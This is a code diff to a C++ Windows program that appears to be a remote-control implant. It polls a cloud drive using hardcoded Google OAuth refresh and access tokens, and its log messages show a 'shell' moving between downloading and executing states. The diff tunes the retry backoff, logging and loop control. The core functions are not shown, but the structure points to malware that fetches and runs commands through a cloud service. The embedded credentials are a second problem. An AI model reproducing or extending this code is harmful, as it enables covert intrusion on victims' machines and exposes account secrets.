@@ -1,3 +1,16 @@
+//#if defined(_DEBUG)
+//#define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_INFO
+//#else
+//#define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_OFF
+//#endif
+//
+//#if SPDLOG_ACTIVE_LEVEL == SPDLOG_LEVEL_OFF
+//#pragma message("SPDLOG_ACTIVE_LEVEL is OFF!")
+//#else
+//#pragma message("SPDLOG_ACTIVE_LEVEL is ACTIVE!")
+//#endif
+
+
 #include <stdio.h>
 #include <iostream>
 #include <windows.h>
@@ -5,12 +18,11 @@
 #include "CloudFunctions.h"
 #include <spdlog/spdlog.h>
 
-#ifdef DISABLE_LOGGING
-#define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_OFF
-#endif
 
 #define INIT_REFRESH_TOKEN "1//0cBJYjJnJ_qNDCgYIARAAGAwSNwF-L9Irkd3ReANUUHaWjvjpylKsfc_H0l2rsXqR1HTtKaXvq_5U2WEtTznd2b4ET5x_ozSQ7xk"
-#define INIT_ACCESS_TOKEN "ya29.a0AeDClZAVWGAhNiMq4r83C2l81hdWXlEZTVZM6PwLt-Ykv-WzBV4pvLrOqKbasCX0lCt0W_w0B8MY2IXlzMLjSVN_Rv2nO3a7O8TfzLmelCIuPzYqGDv5SYVdM4DFQRGSZrQj_O2hDZIRfWsIs2HXLPEnX9gFQxeDjkS3E-8eaCgYKAbQSARASFQHGX2MikAiEu5tuloWf6LrOR5wfHA0175"
+#define INIT_ACCESS_TOKEN "ya29.a0AeDClZD55yq-b55UM2rLL3s3QEZ5_u5Gyb98b0yrOdnVutmaelMZDQaG4oKGCjRzaLUWcrO9q1XqfpUldc7yRY8y3mQBtQpRn-dYaO1SQaWZ_z7ojfaRPPDcUQY5VCM2cP0goyEBAj_tBJSVxTmtW6av6MY3fPoAToMpFhCQrQaCgYKAVUSARASFQHGX2Mij-R0rrWILxJmJNLQdYiZ6A0177"
+#define SLEEP_TIME_THRESHOLD 3125 // 5 ^ 5
+
 int Odd_Num() {
 	int result = rand();
 	if (result % 2 == 1)
@@ -25,12 +37,14 @@ int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmd
 
 }
 
-void main() {
+int main() {
 
+	//Init phase
 	std::stack<BYTE> states;
 	BYTE lastState = STATE_INIT;
 	std::string data, accessToken, refreshToken;
-	DWORD lastIndex = 0, lastSubIndex = 0, tries = 1;
+	DWORD lastIndex = 0, lastSubIndex = 0, tries = 0;
+	DWORD timeThreshold = 0;
 	WORD resCode = BDRIVE_OK;
 	states.push(STATE_DOWNLOADING);
 
@@ -39,10 +53,11 @@ void main() {
 
 	spdlog::info("The for loop is about to start!");
 
+	// This is the main loop of the program
 	for (BYTE top = STATE_INIT; true;) {
-
 		top = states.top();
 
+		// This is an if/else switch case to know what to do next
 		if (top == STATE_DOWNLOADING)
 		{
 			spdlog::info("Shell is in STATE_DOWNLOADING!");
@@ -54,13 +69,13 @@ void main() {
 			{
 			case BDRIVE_OK:
 				spdlog::warn("Download completed!");
-				
+
 				states.push(STATE_EXECUTING);
 				//sleep
 				break;
 			case BDRIVE_INVALID_ACCESS_TOKEN:
 				spdlog::warn("Access token lost!");
-				
+
 				states.push(STATE_DOWNLOADING);
 				states.push(STATE_ACCESS_TOKEN_LOST);
 				//sleep
@@ -74,12 +89,13 @@ void main() {
 			case BDRIVE_TIMED_OUT:
 			case BDRIVE_NO_INTERNET:
 				spdlog::warn("Connection lost!");
-				
+
 				states.push(STATE_DOWNLOADING);
 				states.push(STATE_CONNECTION_LOST);
+				break;
 			default:
 				spdlog::warn("Something unhandled happened!");
-				
+
 				states.push(STATE_DOWNLOADING);
 				break;
 			}
@@ -244,17 +260,31 @@ void main() {
 			}
 		}
 
+		// This is to know how many times we tried this state that we are in
 		if (top == lastState)
 		{
 			tries++;
 		}
 		else {
 			lastState = top;
-			tries = 1;
+			tries = 0;
+			timeThreshold = 0;
 		}
 
-		Sleep(expo(1, tries) * 1000);
+		// This is to not exceed the Time threshold
+		if (timeThreshold < SLEEP_TIME_THRESHOLD - 1)
+		{
+			timeThreshold = expo(5, tries);
+			Sleep(timeThreshold * 1000);
+		}
+		else
+		{
+			Sleep(SLEEP_TIME_THRESHOLD * 1000);
+		}
+
+		//Sleep(1000);
 	}
+	return 0;
 }
 
 void main1() {
